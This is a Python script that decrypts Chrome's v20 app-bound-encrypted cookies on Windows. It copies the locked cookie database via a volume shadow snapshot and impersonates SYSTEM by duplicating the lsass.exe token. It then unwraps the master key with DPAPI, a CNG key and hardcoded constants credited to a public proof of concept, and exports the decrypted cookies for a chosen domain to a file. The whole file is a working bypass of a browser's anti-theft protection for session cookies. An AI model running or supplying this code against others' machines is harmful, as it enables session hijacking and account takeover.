"""Decrypt Chrome ≥127 cookies (v20 / App-Bound Encryption) on Windows.

Requires an elevated (admin) Python so we can:
  * VSS-snapshot the locked Cookies SQLite via shadowcopy,
  * impersonate lsass.exe to access the SYSTEM DPAPI context and
    the CNG key store entry named "Google Chromekey1".

Pipeline for the master AES key:
  Local State → os_crypt.app_bound_encrypted_key (base64, "APPB" prefix)
  -> DPAPI under SYSTEM context        (layer 1)
  -> DPAPI under current user context  (layer 2 — TLV with path validation)
  -> parse TLV (type 0x02 = chrome path, type 0x03 = encrypted key blob)
  -> flag byte selects unwrap algorithm:
        1: hardcoded AES-256-GCM key
        2: hardcoded ChaCha20-Poly1305 key
        3: CNG-decrypt + XOR with constant + AES-256-GCM
  -> 32-byte AES key used for v20 cookie values.

Cookie value layout (v20):
  3 bytes "v20" | 12-byte IV | ciphertext | 16-byte GCM tag
Plaintext starts with 32-byte SHA256(host_key) prefix → stripped.

Public PoC reference (algorithm + hardcoded constants):
  https://github.com/runassu/chrome_v20_decryption
"""
from __future__ import annotations
import sys, io, os, json, base64, sqlite3, ctypes, struct
from pathlib import Path
from ctypes import wintypes, c_void_p, POINTER, byref
import win32api, win32security, win32process, win32con
from Cryptodome.Cipher import AES, ChaCha20_Poly1305
from shadowcopy import shadow_copy

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", line_buffering=True)

HERE = Path(__file__).resolve().parent
USER_DATA = Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"))
LOCAL_STATE = USER_DATA / "Local State"
COOKIE_FILE = USER_DATA / "Default" / "Network" / "Cookies"
COOKIE_COPY = HERE / "_chrome_cookies_copy.sqlite"

# ---------- DPAPI ----------

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(ctypes.c_byte))]


def _blob(data: bytes) -> DATA_BLOB:
    buf = (ctypes.c_byte * len(data)).from_buffer_copy(data)
    return DATA_BLOB(len(data), buf)


def _dpapi_unprotect(data: bytes) -> bytes:
    in_blob = _blob(data)
    out_blob = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            byref(in_blob), None, None, None, None, 0, byref(out_blob)):
        raise ctypes.WinError()
    out = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return out


# ---------- SYSTEM impersonation via lsass.exe ----------

def _enable_privilege(name: str):
    tok = win32security.OpenProcessToken(
        win32api.GetCurrentProcess(),
        win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
    luid = win32security.LookupPrivilegeValue(None, name)
    win32security.AdjustTokenPrivileges(
        tok, False, [(luid, win32security.SE_PRIVILEGE_ENABLED)])


def _find_pid(image_name: str) -> int:
    TH32CS_SNAPPROCESS = 0x00000002
    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD), ("th32DefaultHeapID", c_void_p),
            ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD), ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", wintypes.DWORD), ("szExeFile", ctypes.c_char * 260)]
    k32 = ctypes.windll.kernel32
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    entry = PROCESSENTRY32(); entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
    try:
        target = image_name.lower().encode()
        if not k32.Process32First(snap, byref(entry)): raise ctypes.WinError()
        while True:
            if entry.szExeFile.lower() == target:
                return entry.th32ProcessID
            if not k32.Process32Next(snap, byref(entry)):
                raise FileNotFoundError(image_name)
    finally:
        k32.CloseHandle(snap)


class _Impersonator:
    """Context manager that impersonates lsass.exe (SYSTEM) for the duration."""
    def __enter__(self):
        _enable_privilege("SeDebugPrivilege")
        _enable_privilege("SeImpersonatePrivilege")
        pid = _find_pid("lsass.exe")
        h = win32api.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        try:
            tok = win32security.OpenProcessToken(h, win32con.TOKEN_DUPLICATE)
            self._dup = win32security.DuplicateTokenEx(
                tok, win32security.SecurityImpersonation,
                win32con.TOKEN_QUERY | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_DUPLICATE,
                win32security.TokenImpersonation)
            win32security.ImpersonateLoggedOnUser(self._dup)
        finally:
            try: win32api.CloseHandle(h.handle if hasattr(h, "handle") else h)
            except Exception: pass
        return self
    def __exit__(self, *a):
        win32security.RevertToSelf()


# ---------- CNG decrypt (used for flag=3) ----------

def _cng_decrypt(blob: bytes) -> bytes:
    ncrypt = ctypes.windll.NCRYPT
    NCRYPT_SILENT_FLAG = 0x40
    hProv = c_void_p(0); hKey = c_void_p(0)
    st = ncrypt.NCryptOpenStorageProvider(byref(hProv), ctypes.c_wchar_p("Microsoft Software Key Storage Provider"), 0)
    if st: raise OSError(f"NCryptOpenStorageProvider 0x{st & 0xffffffff:08x}")
    st = ncrypt.NCryptOpenKey(hProv, byref(hKey), ctypes.c_wchar_p("Google Chromekey1"), 0, 0)
    if st:
        ncrypt.NCryptFreeObject(hProv)
        raise OSError(f"NCryptOpenKey('Google Chromekey1') 0x{st & 0xffffffff:08x}")
    try:
        inbuf = (ctypes.c_ubyte * len(blob)).from_buffer_copy(blob)
        out_len = wintypes.DWORD(0)
        # First call to get size.
        st = ncrypt.NCryptDecrypt(hKey, inbuf, len(inbuf), None, None, 0, byref(out_len), NCRYPT_SILENT_FLAG)
        if st: raise OSError(f"NCryptDecrypt(size) 0x{st & 0xffffffff:08x}")
        outbuf = (ctypes.c_ubyte * out_len.value)()
        st = ncrypt.NCryptDecrypt(hKey, inbuf, len(inbuf), None, outbuf, out_len.value, byref(out_len), NCRYPT_SILENT_FLAG)
        if st: raise OSError(f"NCryptDecrypt(decrypt) 0x{st & 0xffffffff:08x}")
        return bytes(outbuf[:out_len.value])
    finally:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProv)


# ---------- ABE master key derivation ----------

# Hardcoded keys reverse-engineered from chrome.exe.  Source:
#   https://github.com/runassu/chrome_v20_decryption
HARDCODED_AES_GCM = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
HARDCODED_CHACHA  = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
XOR_PAD           = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")


def parse_key_blob(blob: bytes) -> dict:
    """Parse the TLV that Chrome ≥130 wraps around the ABE key blob."""
    buf = io.BytesIO(blob)
    header_len = struct.unpack("<I", buf.read(4))[0]
    header = buf.read(header_len)
    content_len = struct.unpack("<I", buf.read(4))[0]
    assert header_len + content_len + 8 == len(blob), \
        f"length mismatch: {header_len}+{content_len}+8 != {len(blob)}"
    out = {"header": header}
    out["flag"] = buf.read(1)[0]
    if out["flag"] in (1, 2):
        out["iv"] = buf.read(12); out["ct"] = buf.read(32); out["tag"] = buf.read(16)
    elif out["flag"] == 3:
        out["encrypted_aes_key"] = buf.read(32)
        out["iv"] = buf.read(12); out["ct"] = buf.read(32); out["tag"] = buf.read(16)
    else:
        raise ValueError(f"Unsupported ABE flag: {out['flag']}")
    return out


def derive_master_key(parsed: dict) -> bytes:
    flag = parsed["flag"]
    if flag == 1:
        cipher = AES.new(HARDCODED_AES_GCM, AES.MODE_GCM, nonce=parsed["iv"])
        return cipher.decrypt_and_verify(parsed["ct"], parsed["tag"])
    if flag == 2:
        cipher = ChaCha20_Poly1305.new(key=HARDCODED_CHACHA, nonce=parsed["iv"])
        return cipher.decrypt_and_verify(parsed["ct"], parsed["tag"])
    if flag == 3:
        with _Impersonator():
            raw = _cng_decrypt(parsed["encrypted_aes_key"])
        derived = bytes(a ^ b for a, b in zip(raw, XOR_PAD))
        cipher = AES.new(derived, AES.MODE_GCM, nonce=parsed["iv"])
        return cipher.decrypt_and_verify(parsed["ct"], parsed["tag"])
    raise ValueError(f"flag {flag}")


def get_app_bound_key() -> bytes:
    with open(LOCAL_STATE, "r", encoding="utf-8") as f:
        state = json.load(f)
    enc = base64.b64decode(state["os_crypt"]["app_bound_encrypted_key"])
    assert enc[:4] == b"APPB"
    enc = enc[4:]
    with _Impersonator():
        layer1 = _dpapi_unprotect(enc)
    layer2 = _dpapi_unprotect(layer1)
    print(f"[abe] layer2 len={len(layer2)}")
    parsed = parse_key_blob(layer2)
    print(f"[abe] flag={parsed['flag']} header={parsed['header']!r}")
    return derive_master_key(parsed)


# ---------- v20 cookie decrypt ----------

def decrypt_v20(blob: bytes, key: bytes) -> str | None:
    if blob[:3] != b"v20":
        return None
    body = blob[3:]
    iv = body[:12]; ct = body[12:-16]; tag = body[-16:]
    pt = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
    if len(pt) >= 32:
        pt = pt[32:]   # strip SHA256(host) prefix written when meta_version ≥ 24
    return pt.decode("utf-8", errors="replace")


def main(domain: str):
    if COOKIE_COPY.exists():
        COOKIE_COPY.unlink()
    shadow_copy(str(COOKIE_FILE), str(COOKIE_COPY))
    print(f"VSS copy ok ({COOKIE_COPY.stat().st_size} bytes)")

    key = get_app_bound_key()
    print(f"ABE master key: {key.hex()[:16]}…  ({len(key)} bytes)")

    con = sqlite3.connect(str(COOKIE_COPY))
    con.text_factory = bytes
    cur = con.cursor()
    cur.execute(
        "SELECT host_key, name, path, expires_utc, is_secure, encrypted_value "
        "FROM cookies WHERE host_key LIKE ?", (f"%{domain}%",))
    rows = cur.fetchall()
    print(f"matching rows: {len(rows)}")

    out_path = HERE / f"{domain.replace('.', '_')}_cookies.txt"
    with open(out_path, "w", encoding="utf-8") as fout:
        fout.write("# Netscape HTTP Cookie File\n# Generated by decrypt_v20.py\n\n")
        ok = 0
        for host, name, path, expires_utc, is_secure, enc in rows:
            try:
                value = decrypt_v20(enc, key)
            except Exception as e:
                print(f"  ! {host!r}/{name!r}: {e}"); continue
            if value is None:
                continue
            unix = int(expires_utc / 1_000_000 - 11644473600) if expires_utc else 0
            if unix < 0: unix = 0
            host_s = host.decode(); name_s = name.decode(); path_s = path.decode() or "/"
            flag_field = "TRUE" if host_s.startswith(".") else "FALSE"
            secure = "TRUE" if is_secure else "FALSE"
            fout.write(f"{host_s}\t{flag_field}\t{path_s}\t{secure}\t{unix}\t{name_s}\t{value}\n")
            ok += 1
    print(f"Wrote {ok} cookies → {out_path}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python decrypt_v20.py <domain_substr>"); sys.exit(2)
    main(sys.argv[1])
